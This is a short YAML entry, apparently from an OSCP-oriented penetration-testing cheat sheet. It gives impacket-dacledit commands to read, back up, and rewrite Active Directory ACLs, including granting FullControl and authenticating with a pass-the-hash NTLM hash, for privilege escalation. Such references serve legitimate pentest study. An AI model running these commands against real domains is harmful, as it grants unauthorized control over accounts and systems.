---
variants:
  - label: read
    command: |
      impacket-dacledit -action read -principal $USER -target '$TARGET_USER' -dc-ip $DCIP '$DOMAIN/$USER:$PASSWORD'
  - label: write
    command: |
      impacket-dacledit -action write -rights FullControl -principal $USER -target '$TARGET_USER' -dc-ip $DCIP '$DOMAIN/$USER:$PASSWORD'
  - label: hash
    command: |
      impacket-dacledit -action read -principal $USER -target '$TARGET_USER' -dc-ip $DCIP -hashes :$HASH '$DOMAIN/$USER'
  - label: restore
    command: |
      impacket-dacledit -action restore -file dacledit.bak -dc-ip $DCIP '$DOMAIN/$USER:$PASSWORD'
description: Read, back up, and modify DACLs on AD objects to find and abuse writable ACEs
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [LDAP, AD]
phase: [Enumeration, PrivEsc]
references:
  - https://github.com/fortra/impacket
---
